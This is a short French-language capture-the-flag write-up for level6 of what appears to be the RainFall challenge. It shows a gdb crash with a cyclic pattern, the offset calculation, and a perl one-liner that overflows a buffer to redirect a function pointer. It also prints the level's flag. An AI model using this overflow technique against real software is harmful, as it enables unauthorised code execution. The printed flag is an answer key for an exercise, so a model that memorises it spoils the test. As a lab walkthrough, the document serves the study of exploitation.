# level6

Il semble qu'on doivent accéder à la fonction n située à l'adresse `0x8048454`.

L'idée serait de changer l'adresse pointée par *v4 avec cette adresse pour pouvoir lancer n.

On commence par faire segfault le programme avec un payload de taille 200 via le site utilisé pour le level2.
```bash
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```
On utilise cette adresse pour calculer l'offset voulu, ce qui nous donne `72`.

On sait que nous voulons ensuite rediriger vers l'adresse de la fonction n, donc on essaye le payload suivant :
```bash
echo $(perl -e 'print "A"x72 ."\x54\x84\x04\x08";') > /tmp/payload
```
On lance ensuite le programme avec ce payload et on obtient directement le flag !
```bash
level6@RainFall:~$ ./level6 $(cat /tmp/payload6)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
